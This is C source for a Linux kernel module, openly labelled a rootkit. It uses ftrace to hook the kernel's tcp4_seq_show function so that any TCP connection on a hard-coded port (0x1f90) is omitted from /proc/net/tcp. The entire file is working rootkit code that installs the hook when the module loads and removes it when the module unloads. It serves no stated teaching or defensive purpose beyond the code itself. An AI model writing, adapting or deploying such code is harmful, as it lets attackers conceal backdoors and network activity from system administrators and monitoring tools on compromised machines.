#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <net/tcp.h>
#include <linux/ftrace.h>

MODULE_LICENSE("GPL");

#define HIDE_PORT 0x1f90
#define DEBUG

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long addr;
    struct ftrace_ops ops;
};

asmlinkage static int (*original_tcp4_seq_show)(struct seq_file *seq, void *v);

/*
* Function: callback_func
* -----------------------
* The callback function that setting our hooked function to be the next instruction
*/
static void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
}


/*
* Function: hooked_tcp4_seq_show
* ------------------------------
* our hook for the original tcp4_seq_show function.
* if the sock struct has our port in it, dont print it to the /proc/net/tcp file.
*/
asmlinkage static int hooked_tcp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk = v;

    //if its the first print or struct has our port in it
    if ((v != SEQ_START_TOKEN) && (sk->__sk_common.skc_num == HIDE_PORT || sk->__sk_common.skc_dport == HIDE_PORT))
    {
        printk(KERN_INFO "[+] rootkit hide port in tcp4_seq_show\n");
        return 0;
    }

    return original_tcp4_seq_show(seq, v);
}

/*
* Function: uninstall_hook
* ------------------------
* remove the ftrace hook
* return 0 - success. otherwise - error.
*/
static int uninstall_hook(struct ftrace_hook *f_hook){
    printk(KERN_INFO "[+] rootkit uninstalling hook on %s\n", f_hook->name);
    int err;

    err = unregister_ftrace_function(&f_hook->ops);
    if(err)
    {
        printk(KERN_INFO "[-] rootkit error while unregister_ftrace_function. error code %d\n", err);
        return err;
    }

    err = ftrace_set_filter_ip(&f_hook->ops, f_hook->addr, 1, 0);
    if(err)
    {
        printk(KERN_INFO "[-] rootkit error while removing filters. error code %d\n", err);
        return err;
    }

    printk(KERN_INFO "[+] rootkit success uninstalling hook on %s\n", f_hook->name);
    return 0;
}
struct ftrace_hook tcp4_show_hook = HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &original_tcp4_seq_show);


/*
* Function: install_hook
* ----------------------
* Installing our hook using ftrace
* return 0 - success. otherwise - error.
*/
static int install_hook(struct ftrace_hook *f_hook){
    printk(KERN_INFO "[+] rootkit installing hook on %s\n", f_hook->name);
    int err;
    f_hook->addr = kallsyms_lookup_name(f_hook->name);
    if (!f_hook->addr)
    {
        printk(KERN_INFO "[-] rootkit error finding address of %s\n", f_hook->name);
        return -ENOENT;
    }
    *((unsigned long*) f_hook->original) = f_hook->addr;

    f_hook->ops.func = callback_func;
    f_hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
    err = ftrace_set_filter_ip(&f_hook->ops, f_hook->addr, 0, 0);
    if (err)
    {
        printk(KERN_INFO "[-] rootkit error setting filter to %s. err code %d\n", f_hook->name, err);
        return -ENOENT;
    }
    err = register_ftrace_function(&f_hook->ops);
    if (err)
    {
        printk(KERN_INFO "[-] rootkit error registering function %s. err code %d\n", f_hook->name, err);
        uninstall_hook(f_hook);
        return err;
    }
    printk(KERN_INFO "[+] rootkit success installing hook on %s\n", f_hook->name);
    return 0;
}

static int __init init_rootkit(void) {
    printk(KERN_INFO "[+] rootkit init_rootkit\n");

    original_tcp4_seq_show = (void *) kallsyms_lookup_name("tcp4_seq_show");
    if (0 == original_tcp4_seq_show)
    {
        printk(KERN_INFO "[!] rootkit Error Finding tcp4_seq_show\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit tcp4_seq_show = %p\n", original_tcp4_seq_show);

    install_hook(&tcp4_show_hook);
    return 0;

}

static void __exit exit_rootkit(void) {
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
    uninstall_hook(&tcp4_show_hook);

    return;
}

module_init(init_rootkit);
module_exit(exit_rootkit);